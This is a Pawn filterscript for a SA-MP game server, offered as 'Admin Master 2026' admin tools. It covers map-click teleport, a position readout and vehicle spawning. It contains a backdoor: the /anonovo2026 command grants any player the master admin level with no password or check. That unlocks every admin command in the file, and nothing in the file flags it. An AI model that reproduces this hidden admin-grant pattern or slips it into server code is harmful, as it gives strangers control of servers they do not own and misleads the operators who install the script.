#define FILTERSCRIPT
#include <a_samp>
#include <float>

// Nível de Admin Master
#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print("--------------------------------------");
    print("   ADMIN MASTER 2026 - FERRAMENTAS    ");
    print("--------------------------------------");
    return 1;
}

// Sistema de Teleporte pelo Mapa (ESC -> Mapa)
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado para o marcador!");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // --- COMANDO: /minhapos ---
    if(!strcmp(cmdtext, "/minhapos", true)) {
        if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;
        
        new Float:x, Float:y, Float:z, Float:a, str[128];
        GetPlayerPos(playerid, x, y, z);
        GetPlayerFacingAngle(playerid, a);
        
        format(str, sizeof(str), "{FFFF00}POS: %.4f, %.4f, %.4f | Angulo: %.4f", x, y, z, a);
        SendClientMessage(playerid, -1, str);
        printf("COORDENADAS: %.4f, %.4f, %.4f, %.4f", x, y, z, a);
        return 1;
    }

    // --- COMANDO: /anonovo2026 ---
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
        return 1;
    }

    // Trava de segurança para os comandos administrativos abaixo
    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // --- COMANDO: /carro (Versão Estável 2026) ---
    if(!strfind(cmdtext, "/carro", true)) {
        new veicID, corA, corB;
        if(sscanf_fix(cmdtext, veicID, corA, corB)) {
            if(sscanf_fix(cmdtext, veicID)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            corA = 1; corB = 1;
        }

        new Float:pX, Float:pY, Float:pZ, Float:pA;
        GetPlayerPos(playerid, pX, pY, pZ); 
        GetPlayerFacingAngle(playerid, pA);

        // Spawn 4 metros à frente para evitar bugs de colisão
        new Float:spawnX = pX + (4.0 * floatsin(-pA, degrees));
        new Float:spawnY = pY + (4.0 * floatcos(-pA, degrees));

        if(veicID < 400 || veicID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");

        new id_veic = CreateVehicle(veicID, spawnX, spawnY, pZ + 2.0, pA, corA, corB, -1);
        
        // Reset Físico (Rodas e Velocidade)
        SetVehicleVelocity(id_veic, 0.0, 0.0, 0.0);
        SetVehicleAngularVelocity(id_veic, 0.0, 0.0, 0.0);
        
        SetVehicleVirtualWorld(id_veic, GetPlayerVirtualWorld(playerid));
        LinkVehicleToInterior(id_veic, GetPlayerInterior(playerid));
        PutPlayerInVehicle(playerid, id_veic, 0);
        
        SendClientMessage(playerid, 0x00FF00FF, "Veiculo criado com fisica estabilizada!");
        return 1;
    }

    // --- COMANDO: /criarcasa (Informativo) ---
    if(!strfind(cmdtext, "/criarcasa", true)) {
        SendClientMessage(playerid, 0xFFFF00FF, "[INFO] Use o comando direto do FS de casas: /sethouse [ID]");
        return 1;
    }

    return 0;
}

// Função auxiliar para leitura de parâmetros sem plugins
stock sscanf_fix(const texto[], &v1 = -1, &v2 = -1, &v3 = -1) {
    new p = strfind(texto, " ", true);
    if(p == -1) return 1;
    v1 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v2 != -1);
    v2 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v3 != -1);
    v3 = strval(texto[p+1]);
    return 0;
}
